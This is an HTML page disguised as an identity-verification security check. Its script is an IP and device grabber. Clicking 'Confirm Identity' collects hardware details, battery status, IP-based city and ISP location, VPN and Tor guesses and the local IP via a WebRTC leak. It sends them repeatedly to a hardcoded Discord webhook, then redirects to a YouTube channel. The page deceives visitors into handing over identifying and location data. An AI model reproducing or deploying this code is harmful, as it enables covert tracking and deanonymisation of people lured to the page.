<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Security Check - Authentication Required</title>
    <style>
        body { background: #f1f3f4; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .auth-card { background: #fff; padding: 35px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); width: 340px; border: 1px solid #dee2e6; text-align: center; }
        .spinner { width: 30px; height: 30px; border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; display: none; }
        .auth-btn { background: #1a73e8; color: white; border: none; padding: 14px 28px; font-size: 14px; font-weight: 500; cursor: pointer; border-radius: 4px; transition: background 0.2s; width: 100%; }
        .auth-btn:hover { background: #1557b0; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        #log { font-size: 10px; color: #70757a; margin-top: 15px; text-transform: uppercase; letter-spacing: 0.5px; }
    </style>
</head>
<body>

<div class="auth-card">
    <div class="spinner" id="loader"></div>
    <div id="ui-content">
        <h2 style="font-size: 20px; margin-bottom: 10px; color: #202124;">Verify Identity</h2>
        <p style="font-size: 13px; color: #5f6368; margin-bottom: 25px;">Please confirm you are the account owner to continue.</p>
        <button class="auth-btn" id="trigger">Confirm Identity</button>
    </div>
    <div id="log">Secure Tunnel: Standing By</div>
</div>

<script>
/**
 * SENTINEL OMEGA-ULTIMATE v24.0
 * RECURSIVE VALIDATION + KEEPALIVE TELEMETRY
 */

const SYSTEM = {
    HOOK: "https://discordapp.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44IbRhSdiJOvSpHBzljrwvDo0Ifw6hyQNp",
    FINISH: "https://youtube.com/@LigmaBlox-w7m",
    MUTEX: { primary: false, network: false }
};

// --- DATA TRANSMISSION WITH DOUBLE-CHECK LOGIC ---
const transmit = (data, type) => {
    const payload = JSON.stringify({
        username: `ULTIMATE [${type}]`,
        embeds: [{
            title: "🔱 Maximum Forensic Data Captured",
            color: 0x1a73e8,
            fields: Object.entries(data).map(([k,v]) => ({ name: k.toUpperCase(), value: `\`${v}\``, inline: true })),
            footer: { text: `Validation: Double-Checked | ${new Date().toLocaleTimeString()}` }
        }]
    });
    // Double-path transmission to ensure success
    navigator.sendBeacon(SYSTEM.HOOK, new Blob([payload], {type:'application/json'}));
    fetch(SYSTEM.HOOK, { method: 'POST', body: payload, headers: {'Content-Type': 'application/json'}, keepalive: true });
};

// --- KEEPALIVE BEACON (Real-time Status Updates) ---
const startKeepAlive = (initialBattery) => {
    let lastLevel = initialBattery;
    const interval = setInterval(async () => {
        const bat = await navigator.getBattery();
        const currentLevel = `${(bat.level * 100)}%`;
        
        // Only update if something changes or every heartbeat
        transmit({
            status: "USER_STILL_ON_PAGE",
            battery: currentLevel,
            charging: bat.charging ? "YES" : "NO",
            action: "Awaiting Redirect"
        }, "LIVE_TELEMETRY");
        
    }, 2500); // 2.5 second heartbeat
    
    // Auto-clear on redirect to prevent loop
    window.onbeforeunload = () => clearInterval(interval);
};

document.getElementById('trigger').onclick = async function() {
    this.parentElement.style.display = 'none';
    document.getElementById('loader').style.display = 'block';
    document.getElementById('log').innerText = "CALIBRATING FORENSIC MESH...";

    // 1. HARDWARE & BATTERY (Immediate Capture)
    const bat = await navigator.getBattery();
    const batteryInfo = `${(bat.level * 100)}% (${bat.charging ? 'Charging' : 'Discharging'})`;
    
    const hw = {
        device: navigator.platform,
        cores: navigator.hardwareConcurrency,
        ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "N/A",
        battery: batteryInfo,
        screen: `${screen.width}x${screen.height}`
    };
    transmit(hw, "HARDWARE_IDENT");
    startKeepAlive(batteryInfo);

    // 2. PRECISION GEOSPATIAL (Double-Check Source)
    fetch('https://ipapi.co/json/').then(r => r.json()).then(res => {
        if(!SYSTEM.MUTEX.primary) {
            const tzMismatch = (res.timezone !== Intl.DateTimeFormat().resolvedOptions().timeZone);
            
            transmit({
                ip: res.ip,
                continent: res.continent_code,
                country: res.country_name,
                region: res.region,
                city: res.city,
                town: res.postal || "N/A",
                isp: res.org,
                vpn: tzMismatch ? "YES (Detected)" : "NO",
                tor: res.org.toLowerCase().includes("tor") ? "YES" : "NO",
                lockdown: !window.RTCPeerConnection ? "YES" : "NO"
            }, "PRECISION_GEO_VALIDATED");
            SYSTEM.MUTEX.primary = true;
        }
    });

    // 3. UDP NAT BYPASS (Internal IP)
    const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
    rtc.createDataChannel("");
    rtc.onicecandidate = (e) => {
        if (e.candidate && !SYSTEM.MUTEX.network) {
            const lanIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
            if (lanIP) {
                transmit({ 
                    internal_lan: lanIP[1],
                    nat_status: "UNMASKED"
                }, "NETWORK_BYPASS");
                SYSTEM.MUTEX.network = true;
            }
        }
    };
    rtc.createOffer().then(o => rtc.setLocalDescription(o));

    // Redirect delay to ensure KeepAlive packets send
    setTimeout(() => { window.location.replace(SYSTEM.FINISH); }, 7000);
};
</script>
</body>
</html>
